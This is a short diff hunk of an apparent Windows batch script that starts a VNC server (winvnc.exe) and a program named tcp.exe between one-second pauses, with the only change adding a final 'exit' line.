@@ -5,3 +5,4 @@ timeout /t 1 >nul
 winvnc.exe -run
 timeout /t 1 >nul
 tcp.exe
+exit
